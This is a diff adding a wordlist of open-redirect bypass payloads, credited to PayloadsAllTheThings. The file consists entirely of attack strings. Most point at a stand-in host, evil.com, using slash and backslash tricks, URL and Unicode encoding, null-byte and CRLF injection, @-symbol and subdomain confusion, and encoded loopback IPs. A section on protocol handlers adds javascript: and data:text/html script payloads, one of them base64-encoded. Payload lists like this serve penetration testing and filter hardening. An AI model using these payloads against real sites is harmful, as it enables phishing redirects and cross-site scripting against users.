@@ -1,0 +1,130 @@
+# Open Redirect Payloads - Based on PayloadsAllTheThings
+
+# Basic
+//evil.com
+///evil.com
+////evil.com
+/\/evil.com
+/\evil.com
+\\evil.com
+\evil.com
+
+# Protocol-based
+https://evil.com
+http://evil.com
+https:evil.com
+http:evil.com
+//evil.com
+///evil.com
+////evil.com
+
+# URL Encoding
+%2f%2fevil.com
+%2f%5cevil.com
+%5c%5cevil.com
+%252f%252fevil.com
+%252f%255cevil.com
+
+# Double URL Encoding
+%252f%252fevil.com
+%255c%255cevil.com
+
+# Unicode/UTF-8
+//evil%E3%80%82com
+//evil。com
+//evil%00.com
+//evil%0d.com
+//evil%0a.com
+
+# Null Byte
+//evil.com%00.good.com
+//evil.com%00good.com
+//evil.com%2500.good.com
+
+# CRLF
+//evil.com%0d%0a.good.com
+//evil.com%0d.good.com
+//evil.com%0a.good.com
+
+# Backslash Tricks
+/\evil.com
+\/evil.com
+//evil.com\@good.com
+//evil.com\.good.com
+
+# @ Symbol
+//good.com@evil.com
+//evil.com@good.com
+//%40evil.com
+
+# Subdomain Tricks
+//good.com.evil.com
+//evil.com/good.com
+//evil.com?good.com
+//evil.com#good.com
+//evil.com%23good.com
+
+# IP Address
+//127.0.0.1
+//0x7f000001
+//2130706433
+//017700000001
+//[::1]
+//0177.0.0.1
+//0x7f.0.0.1
+
+# Protocol Handlers
+javascript:alert(document.domain)
+javascript://evil.com/%0aalert(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# Mixed Case
+//EVIL.COM
+//Evil.Com
+//eViL.cOm
+
+# Whitespace
+// evil.com
+//evil.com 
+//	evil.com
+//evil.com%09
+//evil.com%20
+
+# Fragment
+//evil.com#
+//evil.com#@good.com
+//#@evil.com
+
+# Query String
+//evil.com?
+//evil.com?@good.com
+//?@evil.com
+
+# Path Traversal
+//evil.com/..;/
+//evil.com/%2e%2e/
+//evil.com/%252e%252e/
+
+# Port
+//evil.com:80
+//evil.com:443
+//evil.com:8080
+
+# Credentials
+//user:pass@evil.com
+//user@evil.com
+//:@evil.com
+
+# Special Characters
+//evil。com
+//evil．com
+//evil｡com
+//evil%E3%80%82com
+//evil%EF%BC%8Ecom
+//evil%EF%BD%A1com
+
+# Browser Specific
+///\evil.com
+////\evil.com
+/\\/evil.com
